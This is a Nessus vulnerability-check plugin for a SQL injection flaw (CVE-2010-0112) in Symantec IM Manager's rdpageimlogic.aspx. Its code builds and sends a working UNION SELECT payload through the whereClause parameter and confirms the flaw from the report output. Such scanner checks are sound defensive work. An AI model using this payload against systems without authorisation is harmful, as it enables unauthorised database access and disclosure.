#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(50433);
  script_version("$Revision: 1.9 $");
  script_cvs_date("$Date: 2016/11/17 15:15:44 $");

  script_cve_id("CVE-2010-0112");
  script_bugtraq_id(44299);
  script_osvdb_id(68902);
 
  script_name(english:"Symantec IM Manager whereClause Parameter SQL Injection (SYM10-010)");
  script_summary(english:"Tries to manipulate the Active Users Report");

  script_set_attribute(
    attribute:"synopsis",
    value:
"A web application on the remote Windows host is prone to a SQL
injection attack."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of Symantec IM Manager installed on the remote Windows
host fails to sanitize input to the 'whereClause' parameter of the
'rdpageimlogic.aspx' script before using it in the 'LoggedInUsers.lgx'
definition file to construct database queries. 

An unauthenticated attacker may be able to exploit this issue to
manipulate database queries, leading to disclosure of sensitive
information or attacks against the underlying database. 

Note that the application is also likely to be affected by several
other related SQL injection vulnerabilities, although Nessus has not
checked them."
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://www.zerodayinitiative.com/advisories/ZDI-10-223"
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://seclists.org/fulldisclosure/2010/Oct/424"
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://www.nessus.org/u?bf68d8df"
  );
  script_set_attribute(
    attribute:"solution", 
    value:"Upgrade to Symantec IM Manager 8.4.16 or later."
  );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/10/27");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/10/27");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/11/01");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:symantec:im_manager");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Windows");

  script_copyright(english:"This script is Copyright (C) 2010-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/ASP");

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, asp:TRUE);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/IMManager", cgi_dirs()));
else dirs = make_list("/IMManager");

immanager_installs = 0;
foreach dir (dirs)
{
  # Make sure the page exists.
  url = dir + '/rdpageimlogic.aspx';
  res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

  if (
    'function rdValidateForm()' >< res[2] ||
    '>IMLogService<' >< res[2] ||
    '>IMLogicAdminService<' >< res[2]
  ) immanager_installs++;
  else continue;

  # Try to exploit the issue to manipulate the list of active users.
  magic1 = SCRIPT_NAME;
  magic2 = unixtime();

  # nb: '40478' yields a date of 10/29/2010, when the plugin was written.
  exploit = ' UNION SELECT \'' + magic1 + '\',2,3,40478,5,6,' + magic2 + ',\'' + this_host() + '\' --';
  url = dir + '/rdpageimlogic.aspx?' +
    'rdReport=LoggedInUsers&' +
    'ReportTitle=' + str_replace(find:" ", replace:"%20", string:"Active Users Report") + '&' +
    'timezoneName=GMT&' +
    'TotalRecords=0&' +
    'TotalUniqueUsers=0&' +
    'loginTimeStamp=dateadd(second%2C+0%2C+ir.LoginTimestamp)&' +
    'dbo=dbo.&' + 
    'dateDiffParam=second&' +
    'whereClause=' + str_replace(find:" ", replace:"%20", string:exploit);

  res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

  # There's a problem if we see our special "user" in the "Active Users" report.
  if (
    (
      'META name="lgxver"' >< res[2] ||
      'List of all currently active IM users' >< res[2]
    ) && 
    '<TR Row="1" CLASS=""><TD id="-TD"><SPAN>' + magic1 + '</SPAN>' >< res[2] &&
    '<TD id="-TD"><SPAN>' + magic2 + '</SPAN>' >< res[2]
  )
  {
    if (report_verbosity)
    {
      report = '\n' +
        'Nessus was able to verify the issue by manipulating the Active Users\n' +
        'Report using the following URL :\n' +
        '\n' +
        '  ' + build_url(port:port, qs:url) + '\n';
      security_hole(port:port, extra:report);
    }
    else security_hole(port);

    set_kb_item(name:'www/'+port+'/SQLInjection', value:TRUE);
    exit(0);
  }
}

if (immanager_installs == 0) exit(0, "No installs of Symantec IM Manager were found on the web server on port "+port+".");
else if (immanager_installs == 1) exit(0, "The Symantec IM Manager install hosted on the web server on port "+port+" is not affected.");
else exit(0, "The Symantec IM Manager installs hosted on the web server on port "+port+" are not affected.");
